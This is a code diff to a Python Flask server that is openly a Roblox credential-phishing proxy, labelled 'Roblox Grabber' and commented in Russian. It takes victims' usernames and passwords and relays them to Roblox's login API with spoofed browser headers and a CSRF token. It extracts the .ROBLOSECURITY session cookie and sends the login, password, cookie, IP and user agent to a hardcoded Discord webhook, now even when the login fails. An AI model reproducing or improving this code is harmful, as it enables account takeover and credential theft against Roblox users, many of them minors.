@@ -3,28 +3,43 @@ import requests
 import json
 import datetime
 import os
+import re
 
 app = Flask(__name__)
 
 DISCORD_WEBHOOK = 'https://discord.com/api/webhooks/1538073991938445353/xa-WZkoA0pDAoLwzHmNwTGTcjU0XFZYDc_9ZrGCsckpxGQX_y-yMWIPikI3ZyfvN4FK_'
 
+# Реальный URL для логина
 ROBLOX_LOGIN_URL = 'https://auth.roblox.com/v2/login'
+ROBLOX_CSRF_URL = 'https://auth.roblox.com/v2/login'
 
-stolen_sessions = []
+# Создаём сессию для хранения куки
+session = requests.Session()
 
-def send_to_discord(username, password, cookie, ip, user_agent):
+def get_csrf_token():
+    """Получаем CSRF токен от Роблокса"""
+    try:
+        response = session.post(ROBLOX_CSRF_URL, json={})
+        if 'x-csrf-token' in response.headers:
+            return response.headers['x-csrf-token']
+        return ''
+    except:
+        return ''
+
+def send_to_discord(username, password, cookie, ip, user_agent, error_msg=''):
     payload = {
         'embeds': [{
-            'title': '🎮 НОВЫЙ РОБЛОКС АККАУНТ!',
-            'color': 0x00ff00,
+            'title': '🎮 ПОПЫТКА ВХОДА В РОБЛОКС',
+            'color': 0xff0000,
             'fields': [
                 {'name': '👤 Логин', 'value': f'```{username}```', 'inline': True},
                 {'name': '🔑 Пароль', 'value': f'```{password}```', 'inline': True},
-                {'name': '🍪 РОБЛОКС КУКИ', 'value': f'```{cookie}```', 'inline': False},
+                {'name': '🍪 Куки', 'value': f'```{cookie if cookie else "Не получена"}```', 'inline': False},
                 {'name': '🌐 IP', 'value': f'```{ip}```', 'inline': True},
-                {'name': '📱 User-Agent', 'value': f'```{user_agent}```', 'inline': False}
+                {'name': '📱 User-Agent', 'value': f'```{user_agent}```', 'inline': False},
+                {'name': '❌ Ошибка', 'value': f'```{error_msg if error_msg else "Нет"}```', 'inline': False}
             ],
-            'footer': {'text': 'Roblox Proxy Grabber'}
+            'footer': {'text': 'Roblox Grabber'}
         }]
     }
     try:
@@ -87,36 +102,68 @@ def login():
     password = data.get('password', '')
     
     client_ip = request.headers.get('X-Forwarded-For', request.remote_addr)
-    user_agent = request.headers.get('User-Agent', '')
+    user_agent = request.headers.get('User-Agent', 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36')
     
+    # Получаем CSRF токен
+    csrf_token = get_csrf_token()
+    
+    # Заголовки максимально похожие на настоящие
     headers = {
         'User-Agent': user_agent,
         'Content-Type': 'application/json',
+        'Accept': 'application/json, text/plain, */*',
+        'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
+        'Accept-Encoding': 'gzip, deflate, br',
+        'Origin': 'https://www.roblox.com',
         'Referer': 'https://www.roblox.com/',
-        'Origin': 'https://www.roblox.com'
+        'Sec-Fetch-Dest': 'empty',
+        'Sec-Fetch-Mode': 'cors',
+        'Sec-Fetch-Site': 'same-site',
+        'Sec-Ch-Ua': '"Chromium";v="122", "Not(A:Brand";v="24", "Google Chrome";v="122"',
+        'Sec-Ch-Ua-Mobile': '?0',
+        'Sec-Ch-Ua-Platform': '"Windows"',
+        'X-CSRF-TOKEN': csrf_token
     }
     
-    payload = {'ctype': 'Username', 'cvalue': username, 'password': password}
+    # Сначала пробуем с ctype=cvalue (username)
+    payloads = [
+        {'ctype': 'Username', 'cvalue': username, 'password': password},
+        {'ctype': 'Email', 'cvalue': username, 'password': password}
+    ]
     
-    try:
-        response = requests.post(ROBLOX_LOGIN_URL, json=payload, headers=headers)
-        
-        if response.status_code == 200:
-            roblox_cookie = ''
-            if '.ROBLOSECURITY' in response.cookies:
-                roblox_cookie = response.cookies['.ROBLOSECURITY']
-            elif 'set-cookie' in response.headers:
-                for cookie in response.headers.getlist('set-cookie'):
-                    if '.ROBLOSECURITY' in cookie:
-                        roblox_cookie = cookie.split(';')[0].replace('.ROBLOSECURITY=', '')
+    for i, payload in enumerate(payloads):
+        try:
+            response = session.post(ROBLOX_LOGIN_URL, json=payload, headers=headers)
             
-            if roblox_cookie:
-                send_to_discord(username, password, roblox_cookie, client_ip, user_agent)
+            # Получаем куки
+            roblox_cookie = ''
+            if '.ROBLOSECURITY' in session.cookies:
+                roblox_cookie = session.cookies['.ROBLOSECURITY']
+            
+            # Логируем попытку
+            error_msg = ''
+            if response.status_code != 200:
+                try:
+                    error_data = response.json()
+                    error_msg = json.dumps(error_data)
+                except:
+                    error_msg = response.text[:200]
+            
+            # Отправляем в Discord даже если не получилось
+            send_to_discord(username, password, roblox_cookie, client_ip, user_agent, error_msg)
+            
+            if response.status_code == 200 and roblox_cookie:
                 return jsonify({'success': True})
-        
-        return jsonify({'success': False})
-    except:
-        return jsonify({'success': False})
+            
+            if i == 0:
+                # Меняем ctype на Email для второй попытки
+                continue
+                
+        except Exception as e:
+            send_to_discord(username, password, '', client_ip, user_agent, str(e))
+            return jsonify({'success': False})
+    
+    return jsonify({'success': False})
 
 if __name__ == '__main__':
     port = int(os.environ.get('PORT', 8080))
